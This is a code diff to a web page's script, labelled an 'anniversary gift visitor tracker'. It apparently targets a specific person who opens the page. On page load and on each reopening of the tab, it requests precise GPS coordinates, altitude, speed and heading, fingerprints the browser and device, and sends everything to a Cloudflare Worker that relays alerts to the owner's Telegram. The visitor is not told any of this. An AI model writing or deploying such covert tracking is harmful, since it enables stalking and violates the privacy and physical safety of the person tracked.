@@ -1095,249 +1095,609 @@
 <script defer src="script.js?v=319"></script>
 <!-- Cloudflare Web Analytics --><script type='module' src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "0dc6f2a7eff24098b817ddbd7fc766ba"}'></script><!-- End Cloudflare Web Analytics -->
 <script>
+/* =========================================================
+   ANNIVERSARY GIFT VISITOR TRACKER
+   =========================================================
+
+   FEATURES
+
+   • Initial visit alert
+   • Reopening alert
+   • Precise GPS
+   • GPS accuracy
+   • Altitude
+   • Altitude accuracy
+   • Heading
+   • Speed
+   • Browser detection
+   • Brave detection
+   • Browser version
+   • Rendering engine
+   • iPhone detection
+   • iPad detection
+   • iPadOS-as-Mac detection
+   • iOS 26 Safari handling
+   • Touchscreen detection
+   • Maximum touch points
+   • Screen size
+   • Viewport size
+   • Orientation
+   • Language
+   • Timezone
+   • Network location
+   • ASN
+   • Referrer
+   • Current page
+   • One Telegram message per event
+   • Reopening contains GPS
+   • GPS cannot prevent basic alert
+   ========================================================= */
+
+
+/* =========================================================
+   CONFIGURATION
+========================================================= */
+
 const VISITOR_WORKER =
     "https://flat-bush-3ad6.nassaranwar.workers.dev/";
 
+
+/*
+ * Maximum time we allow the GPS operation to wait.
+ *
+ * The Telegram alert MUST NOT depend forever on GPS.
+ */
+
+const GPS_TIMEOUT =
+    10000;
+
+
+/*
+ * Prevent duplicate reopening events caused by
+ * multiple browser lifecycle events.
+ */
+
 const RETURN_ALERT_COOLDOWN =
-    5 * 1000;
+    5000;
 
 
-/* =========================
-   DEVICE
-========================= */
+/*
+ * Prevent sending multiple initial alerts if a browser
+ * fires unusual page lifecycle events.
+ */
 
-function isIPad() {
+const INITIAL_ALERT_COOLDOWN =
+    3000;
 
-    return (
-        /iPad/i.test(navigator.userAgent) ||
-        (
-            navigator.platform === "MacIntel" &&
-            navigator.maxTouchPoints > 1
-        )
-    );
-}
 
-function getDeviceType() {
+/* =========================================================
+   STATE
+========================================================= */
+
+let lastReturnAlert =
+    0;
+
+let lastInitialAlert =
+    0;
+
+
+/* =========================================================
+   DEVICE DETECTION
+========================================================= */
+
+function detectDevice() {
 
     const ua =
         navigator.userAgent;
 
-    if (isIPad()) {
+
+    /*
+     * Normal iPad UA
+     */
+
+    if (
+        /iPad/i.test(ua)
+    ) {
+
         return "iPad";
     }
 
-    if (/iPhone/i.test(ua)) {
+
+    /*
+     * iPadOS can identify itself as Macintosh.
+     *
+     * maxTouchPoints distinguishes it from a normal Mac.
+     */
+
+    if (
+        navigator.platform ===
+            "MacIntel" &&
+        navigator.maxTouchPoints > 1
+    ) {
+
+        return "iPad";
+    }
+
+
+    /*
+     * iPhone
+     */
+
+    if (
+        /iPhone/i.test(ua)
+    ) {
+
         return "iPhone";
     }
 
-    if (/iPod/i.test(ua)) {
+
+    /*
+     * iPod
+     */
+
+    if (
+        /iPod/i.test(ua)
+    ) {
+
         return "iPod";
     }
 
-    if (/Android/i.test(ua)) {
+
+    /*
+     * Android
+     */
+
+    if (
+        /Android/i.test(ua)
+    ) {
+
         return "Android";
     }
 
-    if (/Macintosh/i.test(ua)) {
+
+    /*
+     * Windows
+     */
+
+    if (
+        /Windows/i.test(ua)
+    ) {
+
+        return "Windows PC";
+    }
+
+
+    /*
+     * Mac
+     */
+
+    if (
+        /Macintosh/i.test(ua)
+    ) {
+
         return "Mac";
     }
 
-    if (/Windows/i.test(ua)) {
-        return "Windows";
-    }
 
     return "Unknown";
 }
 
 
-/* =========================
-   TOUCHSCREEN
-========================= */
+/* =========================================================
+   TOUCHSCREEN DETECTION
+========================================================= */
 
-function isTouchDevice() {
+function detectTouchscreen() {
 
     const ua =
         navigator.userAgent;
 
+
     /*
-     * Explicitly recognize known
-     * touchscreen platforms.
+     * Explicitly identify known mobile
+     * touchscreen devices.
      */
 
     if (
-        /iPhone|iPad|iPod|Android/i.test(ua)
+        /iPhone|iPad|iPod|Android/i.test(
+            ua
+        )
     ) {
+
         return true;
     }
 
+
     /*
-     * iPadOS can identify itself as Mac.
+     * iPadOS masquerading as Macintosh.
      */
 
     if (
-        navigator.platform === "MacIntel" &&
+        navigator.platform ===
+            "MacIntel" &&
         navigator.maxTouchPoints > 0
     ) {
+
         return true;
     }
 
-    return (
-        navigator.maxTouchPoints > 0 ||
+
+    /*
+     * Generic browser signals.
+     */
+
+    if (
+        navigator.maxTouchPoints > 0
+    ) {
+
+        return true;
+    }
+
+
+    if (
         "ontouchstart" in window
-    );
+    ) {
+
+        return true;
+    }
+
+
+    return false;
 }
 
 
-/* =========================
-   BROWSER
-========================= */
+/* =========================================================
+   BROWSER VERSION HELPER
+========================================================= */
 
-function detectVersionFromUA(regex) {
+function getVersion(regex) {
 
     const match =
-        navigator.userAgent.match(regex);
+        navigator.userAgent.match(
+            regex
+        );
+
 
     return match
         ? match[1]
         : "";
 }
 
+
+/* =========================================================
+   BROWSER DETECTION
+========================================================= */
+
 async function detectBrowser() {
 
     const ua =
         navigator.userAgent;
 
-    /*
-     * Brave
-     */
+
+    /* =====================================================
+       BRAVE
+    ===================================================== */
 
     try {
 
         if (
             navigator.brave &&
-            typeof navigator.brave.isBrave ===
-                "function"
+            typeof
+                navigator.brave.isBrave ===
+                    "function"
         ) {
 
-            if (
-                await navigator.brave.isBrave()
-            ) {
+            const brave =
+                await
+                    navigator.brave.isBrave();
+
+
+            if (brave) {
 
                 return {
-                    name: "Brave",
+
+                    name:
+                        "Brave",
+
                     version:
-                        detectVersionFromUA(
+                        getVersion(
                             /Brave\/([0-9.]+)/i
                         ) ||
-                        detectVersionFromUA(
+                        getVersion(
                             /Chrome\/([0-9.]+)/i
                         ),
-                    detection: "Brave API",
-                    engine: detectEngine()
+
+                    detection:
+                        "Brave API",
+
+                    engine:
+                        detectEngine()
                 };
             }
         }
 
-    } catch (e) {}
+    } catch (error) {
+
+        console.log(
+            "Brave detection unavailable:",
+            error
+        );
+    }
 
 
-    if (/Instagram/i.test(ua)) {
+    /* =====================================================
+       INSTAGRAM
+    ===================================================== */
+
+    if (
+        /Instagram/i.test(ua)
+    ) {
 
         return {
-            name: "Instagram",
+
+            name:
+                "Instagram",
+
             version:
-                detectVersionFromUA(
+                getVersion(
                     /Instagram[\s\/]([0-9.]+)/i
                 ),
-            detection: "User-Agent",
-            engine: detectEngine()
+
+            detection:
+                "User-Agent",
+
+            engine:
+                detectEngine()
         };
     }
 
 
-    if (/FBAN|FBAV/i.test(ua)) {
+    /* =====================================================
+       FACEBOOK
+    ===================================================== */
+
+    if (
+        /FBAN|FBAV/i.test(ua)
+    ) {
 
         return {
-            name: "Facebook",
+
+            name:
+                "Facebook",
+
             version:
-                detectVersionFromUA(
+                getVersion(
                     /FBAV\/([0-9.]+)/i
                 ),
-            detection: "User-Agent",
-            engine: detectEngine()
+
+            detection:
+                "User-Agent",
+
+            engine:
+                detectEngine()
         };
     }
 
 
-    if (/TikTok/i.test(ua)) {
+    /* =====================================================
+       TIKTOK
+    ===================================================== */
+
+    if (
+        /TikTok/i.test(ua)
+    ) {
 
         return {
-            name: "TikTok",
+
+            name:
+                "TikTok",
+
             version:
-                detectVersionFromUA(
+                getVersion(
                     /TikTok[\s\/]+([0-9.]+)/i
                 ),
-            detection: "User-Agent",
-            engine: detectEngine()
+
+            detection:
+                "User-Agent",
+
+            engine:
+                detectEngine()
         };
     }
 
 
-    if (/SamsungBrowser/i.test(ua)) {
+    /* =====================================================
+       GOOGLE APP
+    ===================================================== */
+
+    if (
+        /GSA\//i.test(ua)
+    ) {
 
         return {
-            name: "Samsung Internet",
+
+            name:
+                "Google App",
+
             version:
-                detectVersionFromUA(
+                getVersion(
+                    /GSA\/([0-9.]+)/i
+                ),
+
+            detection:
+                "User-Agent",
+
+            engine:
+                detectEngine()
+        };
+    }
+
+
+    /* =====================================================
+       SAMSUNG INTERNET
+    ===================================================== */
+
+    if (
+        /SamsungBrowser/i.test(ua)
+    ) {
+
+        return {
+
+            name:
+                "Samsung Internet",
+
+            version:
+                getVersion(
                     /SamsungBrowser\/([0-9.]+)/i
                 ),
-            detection: "User-Agent",
-            engine: detectEngine()
+
+            detection:
+                "User-Agent",
+
+            engine:
+                detectEngine()
         };
     }
 
 
-    if (/OPR\//i.test(ua)) {
+    /* =====================================================
+       DUCKDUCKGO
+    ===================================================== */
+
+    if (
+        /DuckDuckGo/i.test(ua)
+    ) {
 
         return {
-            name: "Opera",
+
+            name:
+                "DuckDuckGo",
+
             version:
-                detectVersionFromUA(
+                getVersion(
+                    /DuckDuckGo\/([0-9.]+)/i
+                ),
+
+            detection:
+                "User-Agent",
+
+            engine:
+                detectEngine()
+        };
+    }
+
+
+    /* =====================================================
+       YANDEX
+    ===================================================== */
+
+    if (
+        /YaBrowser/i.test(ua)
+    ) {
+
+        return {
+
+            name:
+                "Yandex",
+
+            version:
+                getVersion(
+                    /YaBrowser\/([0-9.]+)/i
+                ),
+
+            detection:
+                "User-Agent",
+
+            engine:
+                detectEngine()
+        };
+    }
+
+
+    /* =====================================================
+       OPERA
+    ===================================================== */
+
+    if (
+        /OPR\//i.test(ua)
+    ) {
+
+        return {
+
+            name:
+                "Opera",
+
+            version:
+                getVersion(
                     /OPR\/([0-9.]+)/i
                 ),
-            detection: "User-Agent",
-            engine: detectEngine()
+
+            detection:
+                "User-Agent",
+
+            engine:
+                detectEngine()
         };
     }
 
 
-    if (/Edg\//i.test(ua)) {
+    /* =====================================================
+       EDGE
+    ===================================================== */
+
+    if (
+        /Edg\//i.test(ua)
+    ) {
 
         return {
-            name: "Microsoft Edge",
+
+            name:
+                "Microsoft Edge",
+
             version:
-                detectVersionFromUA(
+                getVersion(
                     /Edg\/([0-9.]+)/i
                 ),
-            detection: "User-Agent",
-            engine: detectEngine()
+
+            detection:
+                "User-Agent",
+
+            engine:
+                detectEngine()
         };
     }
 
 
-    if (/Firefox\//i.test(ua)) {
+    /* =====================================================
+       FIREFOX
+    ===================================================== */
+
+    if (
+        /Firefox\//i.test(ua)
+    ) {
 
         return {
-            name: "Firefox",
+
+            name:
+                "Firefox",
+
             version:
-                detectVersionFromUA(
+                getVersion(
                     /Firefox\/([0-9.]+)/i
                 ),
-            detection: "User-Agent",
-            engine: detectEngine()
+
+            detection:
+                "User-Agent",
+
+            engine:
+                detectEngine()
         };
     }
 
+
+    /* =====================================================
+       CHROME
+    ===================================================== */
 
     if (
         /Chrome\//i.test(ua) &&
@@ -1345,74 +1705,120 @@ async function detectBrowser() {
     ) {
 
         return {
-            name: "Chrome",
+
+            name:
+                "Chrome",
+
             version:
-                detectVersionFromUA(
+                getVersion(
                     /Chrome\/([0-9.]+)/i
                 ),
-            detection: "User-Agent",
-            engine: detectEngine()
+
+            detection:
+                "User-Agent",
+
+            engine:
+                detectEngine()
         };
     }
 
 
-    if (/Safari\//i.test(ua)) {
+    /* =====================================================
+       SAFARI — LAST
+    ===================================================== */
+
+    if (
+        /Safari\//i.test(ua)
+    ) {
 
         return {
-            name: "Safari",
+
+            name:
+                "Safari",
+
             version:
-                detectVersionFromUA(
+                getVersion(
                     /Version\/([0-9.]+)/i
-                ) || "Unknown",
-            detection: "User-Agent",
-            engine: detectEngine()
+                ) ||
+                "Unknown",
+
+            detection:
+                "User-Agent",
+
+            engine:
+                detectEngine()
         };
     }
 
 
     return {
-        name: "Unknown",
-        version: "",
-        detection: "No reliable browser signal",
-        engine: detectEngine()
+
+        name:
+            "Unknown",
+
+        version:
+            "",
+
+        detection:
+            "No reliable browser signal",
+
+        engine:
+            detectEngine()
     };
 }
 
 
-/* =========================
+/* =========================================================
    ENGINE
-========================= */
+========================================================= */
 
 function detectEngine() {
 
     const ua =
         navigator.userAgent;
 
-    if (/AppleWebKit/i.test(ua)) {
+
+    if (
+        /AppleWebKit/i.test(ua)
+    ) {
+
         return "WebKit";
     }
 
-    if (/Gecko/i.test(ua)) {
+
+    if (
+        /Gecko/i.test(ua)
+    ) {
+
         return "Gecko";
     }
 
-    if (/Trident/i.test(ua)) {
+
+    if (
+        /Trident/i.test(ua)
+    ) {
+
         return "Trident";
     }
+
 
     return "Unknown";
 }
 
 
-/* =========================
-   OS
-========================= */
+/* =========================================================
+   OPERATING SYSTEM
+========================================================= */
 
 function detectOS() {
 
     const ua =
         navigator.userAgent;
 
+
+    /* =====================================================
+       iOS / iPadOS
+    ===================================================== */
 
     if (
         /iPhone|iPad|iPod/i.test(ua)
@@ -1423,6 +1829,7 @@ function detectOS() {
                 /OS (\d+)[._](\d+)(?:[._](\d+))?/i
             );
 
+
         if (match) {
 
             const major =
@@ -1431,6 +1838,11 @@ function detectOS() {
             const minor =
                 Number(match[2]);
 
+
+            /*
+             * iOS/iPadOS 26 Safari uses a frozen
+             * OS UA value instead of exposing 26.
+             */
 
             if (
                 major === 18 &&
@@ -1442,7 +1854,7 @@ function detectOS() {
 
                 return (
                     "iOS/iPadOS 26+ " +
-                    "(exact version hidden by WebKit)"
+                    "(exact OS version hidden by WebKit)"
                 );
             }
 
@@ -1451,22 +1863,31 @@ function detectOS() {
                 `iOS/iPadOS ${match[1]}.${match[2]}` +
                 (
                     match[3]
-                        ? "." + match[3]
+                        ? "." +
+                          match[3]
                         : ""
                 )
             );
         }
 
+
         return "iOS/iPadOS";
     }
 
 
-    if (/Android/i.test(ua)) {
+    /* =====================================================
+       ANDROID
+    ===================================================== */
+
+    if (
+        /Android/i.test(ua)
+    ) {
 
         const match =
             ua.match(
                 /Android ([0-9.]+)/i
             );
+
 
         return match
             ? `Android ${match[1]}`
@@ -1474,17 +1895,38 @@ function detectOS() {
     }
 
 
-    if (/Windows NT/i.test(ua)) {
+    /* =====================================================
+       WINDOWS
+    ===================================================== */
+
+    if (
+        /Windows/i.test(ua)
+    ) {
+
         return "Windows";
     }
 
 
-    if (/Mac OS X/i.test(ua)) {
+    /* =====================================================
+       MACOS
+    ===================================================== */
+
+    if (
+        /Mac OS X/i.test(ua)
+    ) {
+
         return "macOS";
     }
 
 
-    if (/Linux/i.test(ua)) {
+    /* =====================================================
+       LINUX
+    ===================================================== */
+
+    if (
+        /Linux/i.test(ua)
+    ) {
+
         return "Linux";
     }
 
@@ -1493,19 +1935,204 @@ function detectOS() {
 }
 
 
-/* =========================
-   COMMON DATA
-========================= */
+/* =========================================================
+   GPS
+========================================================= */
+
+function getPreciseLocation() {
+
+    return new Promise(
+        resolve => {
+
+            /*
+             * Geolocation unavailable.
+             */
+
+            if (
+                !navigator.geolocation
+            ) {
+
+                resolve(null);
+
+                return;
+            }
+
+
+            let completed =
+                false;
+
+
+            function finish(
+                result
+            ) {
+
+                if (
+                    completed
+                ) {
+
+                    return;
+                }
+
+
+                completed =
+                    true;
+
+
+                resolve(
+                    result
+                );
+            }
+
+
+            /*
+             * Independent safety timeout.
+             *
+             * Even if the browser itself gets stuck,
+             * our tracker continues.
+             */
+
+            const safetyTimer =
+                setTimeout(
+                    () => {
+
+                        console.log(
+                            "GPS safety timeout."
+                        );
+
+                        finish(null);
+
+                    },
+                    GPS_TIMEOUT + 1000
+                );
+
+
+            navigator.geolocation
+                .getCurrentPosition(
+
+                    position => {
+
+                        clearTimeout(
+                            safetyTimer
+                        );
+
+
+                        const coords =
+                            position.coords;
+
+
+                        finish({
+
+                            latitude:
+                                coords.latitude,
+
+                            longitude:
+                                coords.longitude,
+
+                            accuracy:
+                                coords.accuracy,
+
+                            altitude:
+                                coords.altitude,
+
+                            altitudeAccuracy:
+                                coords.altitudeAccuracy,
+
+                            heading:
+                                coords.heading,
+
+                            speed:
+                                coords.speed
+                        });
+
+                    },
+
+
+                    error => {
+
+                        clearTimeout(
+                            safetyTimer
+                        );
+
+
+                        console.log(
+                            "GPS error:",
+                            error.code,
+                            error.message
+                        );
+
+
+                        finish(null);
+                    },
+
+
+                    {
+
+                        enableHighAccuracy:
+                            true,
+
+                        maximumAge:
+                            0,
+
+                        timeout:
+                            GPS_TIMEOUT
+                    }
+                );
+        }
+    );
+}
+
+
+/* =========================================================
+   NETWORK INFORMATION
+========================================================= */
+
+function getNetworkInformation() {
+
+    /*
+     * These values are populated by the Worker from
+     * Cloudflare request information.
+     *
+     * We leave these fields here so the payload structure
+     * stays explicit and extensible.
+     */
+
+    return {
+
+        country:
+            "",
+
+        region:
+            "",
+
+        city:
+            "",
+
+        networkTimezone:
+            "",
+
+        asn:
+            ""
+    };
+}
+
+
+/* =========================================================
+   COMMON BROWSER DATA
+========================================================= */
 
 async function getCommonData() {
 
     const browser =
         await detectBrowser();
 
-    const ua =
-        navigator.userAgent;
+
+    const network =
+        getNetworkInformation();
+
 
     return {
+
+        /* Browser */
 
         browser:
             browser.name,
@@ -1519,11 +2146,30 @@ async function getCommonData() {
         engine:
             browser.engine,
 
+
+        /* Operating system */
+
         os:
             detectOS(),
 
+
+        /* Device */
+
         device:
-            getDeviceType(),
+            detectDevice(),
+
+
+        /* Touch */
+
+        touchScreen:
+            detectTouchscreen(),
+
+        maxTouchPoints:
+            navigator.maxTouchPoints ||
+            0,
+
+
+        /* Screen */
 
         screenWidth:
             window.screen.width,
@@ -1531,29 +2177,36 @@ async function getCommonData() {
         screenHeight:
             window.screen.height,
 
+
+        /* Viewport */
+
         viewportWidth:
             window.innerWidth,
 
         viewportHeight:
             window.innerHeight,
 
+
+        /* Orientation */
+
         orientation:
             screen.orientation?.type ||
-            "Unknown",
+            (
+                window.innerWidth >
+                window.innerHeight
+                    ? "landscape"
+                    : "portrait"
+            ),
 
-        /*
-         * Robust touchscreen detection.
-         */
 
-        touchScreen:
-            isTouchDevice(),
-
-        maxTouchPoints:
-            navigator.maxTouchPoints || 0,
+        /* Language */
 
         language:
             navigator.language ||
             "Unknown",
+
+
+        /* Timezone */
 
         timezone:
             Intl.DateTimeFormat()
@@ -1561,111 +2214,67 @@ async function getCommonData() {
                 .timeZone ||
             "Unknown",
 
+
+        /* Page */
+
         page:
             location.href,
 
+
+        /* Referrer */
+
         referrer:
-            document.referrer || ""
+            document.referrer ||
+            "",
+
+
+        /* Network placeholders */
+
+        ...network
     };
 }
 
 
-/* =========================
-   GPS
-========================= */
+/* =========================================================
+   SEND COMBINED ALERT
+========================================================= */
 
-function getPreciseLocation() {
-
-    return new Promise(
-        (resolve) => {
-
-            if (
-                !navigator.geolocation
-            ) {
-
-                resolve(null);
-                return;
-            }
-
-
-            navigator.geolocation
-                .getCurrentPosition(
-
-                    position => {
-
-                        resolve({
-                            latitude:
-                                position.coords.latitude,
-
-                            longitude:
-                                position.coords.longitude,
-
-                            accuracy:
-                                position.coords.accuracy,
-
-                            altitude:
-                                position.coords.altitude,
-
-                            altitudeAccuracy:
-                                position.coords
-                                    .altitudeAccuracy,
-
-                            heading:
-                                position.coords.heading,
-
-                            speed:
-                                position.coords.speed
-                        });
-
-                    },
-
-                    error => {
-
-                        console.log(
-                            "GPS unavailable:",
-                            error.code,
-                            error.message
-                        );
-
-                        resolve(null);
-                    },
-
-                    {
-                        enableHighAccuracy: true,
-
-                        maximumAge: 0,
-
-                        timeout: 30000
-                    }
-                );
-        }
-    );
-}
-
-
-/* =========================
-   COMBINED ALERT
-========================= */
-
-async function sendCombinedAlert(type) {
+async function sendCombinedAlert(
+    type
+) {
 
     try {
 
         /*
-         * Get GPS FIRST.
+         * IMPORTANT:
          *
-         * This means the Telegram message
-         * is sent only once, after we know
-         * whether GPS succeeded.
+         * GPS and browser information are gathered
+         * independently.
+         *
+         * GPS failure does NOT cancel the alert.
          */
 
-        const location =
-            await getPreciseLocation();
+        const gpsPromise =
+            getPreciseLocation();
 
 
-        const common =
-            await getCommonData();
+        const commonPromise =
+            getCommonData();
 
+
+        const [
+            gps,
+            common
+        ] =
+            await Promise.all([
+                gpsPromise,
+                commonPromise
+            ]);
+
+
+        /* =================================================
+           BUILD PAYLOAD
+        ================================================= */
 
         const payload = {
 
@@ -1675,160 +2284,235 @@ async function sendCombinedAlert(type) {
         };
 
 
-        /*
-         * Add GPS to the SAME request.
-         */
+        /* =================================================
+           GPS
+        ================================================= */
 
-        if (location) {
+        if (
+            gps
+        ) {
 
             payload.latitude =
-                location.latitude;
+                gps.latitude;
 
             payload.longitude =
-                location.longitude;
+                gps.longitude;
 
             payload.accuracy =
-                location.accuracy;
+                gps.accuracy;
 
             payload.altitude =
-                location.altitude;
+                gps.altitude;
 
             payload.altitudeAccuracy =
-                location.altitudeAccuracy;
+                gps.altitudeAccuracy;
 
             payload.heading =
-                location.heading;
+                gps.heading;
 
             payload.speed =
-                location.speed;
+                gps.speed;
         }
 
 
-        await fetch(
-            VISITOR_WORKER,
-            {
-                method: "POST",
+        /* =================================================
+           SEND TO WORKER
+        ================================================= */
 
-                headers: {
-                    "Content-Type":
-                        "application/json"
-                },
+        const response =
+            await fetch(
+                VISITOR_WORKER,
+                {
 
-                body:
-                    JSON.stringify(payload),
+                    method:
+                        "POST",
 
-                keepalive: true
-            }
-        );
+                    headers: {
+
+                        "Content-Type":
+                            "application/json"
+                    },
+
+                    body:
+                        JSON.stringify(
+                            payload
+                        ),
+
+                    /*
+                     * keepalive lets the request survive
+                     * certain page lifecycle transitions.
+                     */
+
+                    keepalive:
+                        true
+                }
+            );
+
+
+        /* =================================================
+           CHECK WORKER
+        ================================================= */
+
+        if (
+            !response.ok
+        ) {
+
+            const errorText =
+                await response.text();
+
+
+            console.error(
+                "ANNIVERSARY TRACKER WORKER ERROR:",
+                response.status,
+                errorText
+            );
+
+
+            return false;
+        }
+
 
         console.log(
-            type === "return"
-                ? "Combined reopening alert sent."
-                : "Combined visit alert sent."
+            "ANNIVERSARY TRACKER:",
+            type,
+            "sent successfully."
         );
+
+
+        return true;
 
     } catch (error) {
 
-        console.log(
-            "Tracking error:",
+        console.error(
+            "ANNIVERSARY TRACKER ERROR:",
             error
         );
+
+
+        return false;
     }
 }
 
 
-/* =========================
+/* =========================================================
    INITIAL VISIT
-========================= */
+========================================================= */
 
-(async function () {
+async function handleInitialVisit() {
+
+    const now =
+        Date.now();
+
 
     /*
-     * ONE message only.
-     *
-     * GPS + device + browser + display
-     * all go together.
+     * Prevent accidental duplicate initial messages.
      */
 
-    await sendCombinedAlert("visit");
+    if (
+        now - lastInitialAlert <
+        INITIAL_ALERT_COOLDOWN
+    ) {
 
-})();
+        return;
+    }
 
 
-/* =========================
+    lastInitialAlert =
+        now;
+
+
+    await sendCombinedAlert(
+        "visit"
+    );
+}
+
+
+/* =========================================================
    REOPENING
-========================= */
+========================================================= */
 
-let lastReturnAlert = 0;
+async function handleReopening() {
 
+    const now =
+        Date.now();
+
+
+    /*
+     * Prevent visibilitychange + pageshow from
+     * generating two reopening messages.
+     */
+
+    if (
+        now - lastReturnAlert <
+        RETURN_ALERT_COOLDOWN
+    ) {
+
+        return;
+    }
+
+
+    lastReturnAlert =
+        now;
+
+
+    /*
+     * ONE message.
+     *
+     * GPS is included in this same message.
+     */
+
+    await sendCombinedAlert(
+        "return"
+    );
+}
+
+
+/* =========================================================
+   INITIAL PAGE LOAD
+========================================================= */
+
+handleInitialVisit();
+
+
+/* =========================================================
+   VISIBILITY CHANGE
+========================================================= */
 
 document.addEventListener(
     "visibilitychange",
-    async () => {
+    () => {
 
         if (
             document.visibilityState ===
             "visible"
         ) {
 
-            const now =
-                Date.now();
-
-
-            if (
-                now - lastReturnAlert <
-                RETURN_ALERT_COOLDOWN
-            ) {
-                return;
-            }
-
-
-            lastReturnAlert =
-                now;
-
-
-            /*
-             * ONE reopening message
-             * INCLUDING FRESH GPS.
-             */
-
-            await sendCombinedAlert(
-                "return"
-            );
+            handleReopening();
         }
     }
 );
 
 
-/* =========================
-   BFCache
-========================= */
+/* =========================================================
+   BFCACHE / PAGESHOW
+========================================================= */
 
 window.addEventListener(
     "pageshow",
-    async event => {
+    event => {
 
-        if (event.persisted) {
+        /*
+         * Only handle BFCache restoration.
+         *
+         * Normal initial pageshow must NOT generate
+         * a second Telegram alert.
+         */
 
-            const now =
-                Date.now();
+        if (
+            event.persisted
+        ) {
 
-
-            if (
-                now - lastReturnAlert <
-                RETURN_ALERT_COOLDOWN
-            ) {
-                return;
-            }
-
-
-            lastReturnAlert =
-                now;
-
-
-            await sendCombinedAlert(
-                "return"
-            );
+            handleReopening();
         }
     }
 );
